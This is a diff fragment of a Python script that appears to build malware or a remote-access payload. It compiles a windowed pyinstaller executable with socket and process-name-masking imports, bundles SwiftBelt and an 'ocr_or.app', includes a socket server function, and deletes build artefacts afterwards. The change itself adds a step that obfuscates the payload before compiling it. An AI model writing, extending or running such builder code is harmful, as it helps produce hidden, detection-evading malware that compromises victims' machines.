@@ -489,11 +489,13 @@ os.system(dest)
             '''
             hider.write(v)
             hider.close()
+            import obfuscator
+            obfuscator.MainMenu(name2)
             if icochoice:
-                os.system('sudo pyinstaller -i '+icochoice+' --windowed --hidden-import imp --hidden-import socket --hidden-import urllib3 --hidden-import setproctitle --add-data "SwiftBelt:swiftbelt" --add-data "ocr_or.app:ocr" '+str(name2))
+                os.system('sudo pyinstaller -i '+icochoice+' --windowed --hidden-import imp --hidden-import socket --hidden-import urllib3 --hidden-import setproctitle --add-data "SwiftBelt:swiftbelt" --add-data "ocr_or.app:ocr" '+str(name2)+'_or.py')
   
             else:
-                os.system('sudo pyinstaller --windowed --hidden-import imp --hidden-import socket --hidden-import urllib3 --hidden-import setproctitle --add-data "SwiftBelt:swiftbelt" --add-data "ocr_or.app:ocr" '+str(name2))
+                os.system('sudo pyinstaller --windowed --hidden-import imp --hidden-import socket --hidden-import urllib3 --hidden-import setproctitle --add-data "SwiftBelt:swiftbelt" --add-data "ocr_or.app:ocr" '+str(name2)+'_or.py')
 def server():
     import socket
 
@@ -553,8 +555,8 @@ def cleanup():
             os.remove('ocr_or.spec')
             if platform.system() == 'Windows':
                 shutil.rmtree(os.getcwd()+'/dist/ocr_or.exe')
-        if reps==True:
-            shutil.rmtree(os.getcwd()+'/dist/'+name2)
+            else:
+                shutil.rmtree(os.getcwd()+'/dist/'+name2)
     except FileNotFoundError:
         pass
 
